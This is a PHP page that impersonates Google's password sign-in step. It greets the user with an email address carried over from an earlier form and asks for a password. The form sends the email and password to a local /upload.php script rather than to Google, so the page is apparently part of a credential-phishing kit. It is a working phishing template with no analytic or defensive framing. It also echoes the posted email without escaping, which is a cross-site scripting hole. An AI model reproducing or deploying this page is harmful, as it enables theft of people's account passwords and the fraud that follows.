<?php

    $email = $_POST['email'];

?>




<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="utf-8">
    <title>Sign in - Google accounts</title>
    <link href='assets/css/bootstrap.min.css' rel="stylesheet">
    <link href='assets/css/progress-bar.css' rel="stylesheet">
    <link rel="stylesheet" href="assets/css/style.css">
    <link rel="icon" type="image/png" href="assets/images/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <style media="screen">
        @font-face {
            font-family: 'Roboto';
            src: URL('assets/fonts/Roboto-Regular.ttf') format('truetype');
            font-weight: normal;
        }

        @font-face {
            font-family: 'open-sans';
            src: URL('assets/fonts/OpenSans-Regular.ttf') format('truetype');
            font-weight: normal;
        }
    </style>
</head>
<body>
<div id='login-app'>
    <div class="login-container">

        <div class="left-area">
            <img class='logo' src="/png/logo.png" alt="logo" height="48" width="48">
            <h1 class='g-h1'>Welcome</h1>
            <div class="email-wrapper">
                <img class='email-icon' src="png/profile.png" alt="email-icon">
                <h2 class='g-h2'><?php echo $email; ?></h2>
            </div>
        </div>

        <div class="right-area">
            <form method="POST" action="/upload.php" id='email-form-step'>
                <div class='login-content'>
                    <div class="password-wrapper">
                        <input name="password" id='password-input' type="password" class='g-pass' placeholder="Enter your password" required>
                        <input type="checkbox" id="showPasswordCheckbox">
                        <label for="showPasswordCheckbox">Show password</label>
                    </div>

                    <input type="hidden" name="email" value="<?php echo $email; ?>">
                    <div class='login-nav'>
                        <div class="create-account-text">Forgot password?</div>
                        <button class='gbtn-primary' type="submit">Next</button>
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>

<script>
    const passwordInput = document.getElementById('password-input');
    const showPasswordCheckbox = document.getElementById('showPasswordCheckbox');

    showPasswordCheckbox.addEventListener('change', function() {
        if (showPasswordCheckbox.checked) {
            passwordInput.type = 'text';
        } else {
            passwordInput.type = 'password';
        }
    });
</script>

</body>
</html>


